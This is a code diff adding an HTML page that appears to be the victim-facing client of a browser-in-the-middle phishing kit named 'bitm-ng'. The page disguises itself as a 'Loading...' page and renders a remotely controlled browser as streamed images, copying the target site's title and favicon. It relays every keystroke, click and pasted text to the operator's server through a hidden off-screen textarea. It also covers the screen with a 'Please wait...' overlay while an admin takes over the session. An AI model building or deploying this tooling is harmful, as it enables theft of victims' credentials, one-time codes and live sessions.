@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Loading...</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body {
+      width: 100%; height: 100%;
+      overflow: hidden;
+      background: #000;
+      cursor: default;
+    }
+    #canvas {
+      display: block;
+      width: 100%;
+      height: 100%;
+    }
+    #overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.6);
+      color: #fff;
+      font-family: sans-serif;
+      font-size: 18px;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      z-index: 999;
+    }
+    #overlay.active { display: flex; }
+  </style>
+</head>
+<body>
+  <canvas id="canvas"></canvas>
+  <div id="overlay"></div>
+  <!-- Off-screen editable element — keeps focus so paste events fire reliably -->
+  <textarea id="paste-sink" tabindex="-1" aria-hidden="true"
+    style="position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;resize:none;"></textarea>
+
+  <!-- Socket.IO client — served by the server -->
+  <script src="/socket.io/socket.io.js"></script>
+  <script>
+    (function () {
+      'use strict';
+
+      // ── Config ────────────────────────────────────────────────────────────
+      const params = new URLSearchParams(location.search);
+      const TARGET = params.get('t') || window.__cpTarget || 'default';
+
+      // ── Canvas setup ───────────────────────────────────────────────────────
+      const canvas    = document.getElementById('canvas');
+      const ctx       = canvas.getContext('2d');
+      const overlay   = document.getElementById('overlay');
+      const pasteSink = document.getElementById('paste-sink');
+
+      function resizeCanvas() {
+        const dpr = window.devicePixelRatio || 1;
+        canvas.width  = Math.round(window.innerWidth  * dpr);
+        canvas.height = Math.round(window.innerHeight * dpr);
+      }
+      resizeCanvas();
+      window.addEventListener('resize', resizeCanvas);
+
+      // ── Socket.IO connection ───────────────────────────────────────────────
+      const socket = io({
+        transports: ['websocket'],
+      });
+
+      // ── Frame rendering ───────────────────────────────────────────────────
+      socket.on('frame', (frameData) => {
+        // Normalize to Blob — handles ArrayBuffer vs Buffer differences
+        const blob = new Blob(
+          [new Uint8Array(frameData)],
+          { type: 'image/jpeg' }
+        );
+
+        createImageBitmap(blob).then((bitmap) => {
+          ctx.drawImage(bitmap, 0, 0, canvas.width, canvas.height);
+          bitmap.close();
+        }).catch(() => {});
+      });
+
+      // ── Session start ─────────────────────────────────────────────────────
+      socket.on('connect', () => {
+        socket.emit('new_phish', {
+          width:  window.innerWidth,
+          height: window.innerHeight,
+          target: TARGET,
+        });
+        pasteSink.focus();
+      });
+
+      // ── Page title + favicon ──────────────────────────────────────────────
+      socket.on('page_meta', ({ title, favicon }) => {
+        document.title = title || 'Loading...';
+        let link = document.querySelector('link[rel="icon"]');
+        if (!link) {
+          link = document.createElement('link');
+          link.rel = 'icon';
+          document.head.appendChild(link);
+        }
+        link.href = favicon;
+      });
+
+      // ── Admin takeover notifications ───────────────────────────────────────
+      socket.on('taken_over', () => {
+        overlay.textContent = 'Please wait...';
+        overlay.classList.add('active');
+      });
+
+      socket.on('control_returned', () => {
+        overlay.classList.remove('active');
+        overlay.textContent = '';
+      });
+
+      socket.on('error', (msg) => {
+        console.error('[bitm-ng] error:', msg);
+      });
+
+      // ── Mouse events ───────────────────────────────────────────────────────
+      canvas.addEventListener('mousemove', (e) => {
+        socket.emit('mouse_move', { x: e.clientX, y: e.clientY });
+      });
+
+      canvas.addEventListener('click', (e) => {
+        socket.emit('mouse_click', {
+          x: e.clientX,
+          y: e.clientY,
+          button: buttonName(e.button),
+        });
+        pasteSink.focus(); // restore focus so paste keeps working after clicks
+      });
+
+      canvas.addEventListener('contextmenu', (e) => {
+        e.preventDefault();
+        socket.emit('mouse_click', {
+          x: e.clientX,
+          y: e.clientY,
+          button: 'right',
+        });
+      });
+
+      canvas.addEventListener('wheel', (e) => {
+        e.preventDefault();
+        socket.emit('mouse_scroll', {
+          x: e.clientX,
+          y: e.clientY,
+          deltaX: e.deltaX,
+          deltaY: e.deltaY,
+        });
+      }, { passive: false });
+
+      // ── Keyboard events ────────────────────────────────────────────────────
+      const MODIFIERS = new Set(['Meta', 'Control', 'Alt', 'Shift']);
+
+      document.addEventListener('keydown', (e) => {
+        // Cmd/Ctrl+V: focus sink and let paste land in it naturally
+        if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'v') {
+          pasteSink.focus();
+          return;
+        }
+        // Don't preventDefault on modifier keys — suppressing Meta breaks Cmd+V recognition
+        if (MODIFIERS.has(e.key)) {
+          socket.emit('key_down', { key: e.key, code: e.code });
+          return;
+        }
+        e.preventDefault();
+        socket.emit('key_down', { key: e.key, code: e.code });
+      });
+
+      document.addEventListener('keyup', (e) => {
+        if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'v') return;
+        if (!MODIFIERS.has(e.key)) e.preventDefault();
+        socket.emit('key_up', { key: e.key, code: e.code });
+      });
+
+      // ── Paste support ──────────────────────────────────────────────────────
+      // Read pasteSink.value via input event — avoids clipboardData access quirks
+      pasteSink.addEventListener('input', () => {
+        const text = pasteSink.value;
+        if (!text) return;
+        pasteSink.value = '';
+        socket.emit('paste', { text });
+      });
+
+      // ── Helpers ────────────────────────────────────────────────────────────
+      function buttonName(btn) {
+        if (btn === 1) return 'middle';
+        if (btn === 2) return 'right';
+        return 'left';
+      }
+    })();
+  </script>
+</body>
+</html>
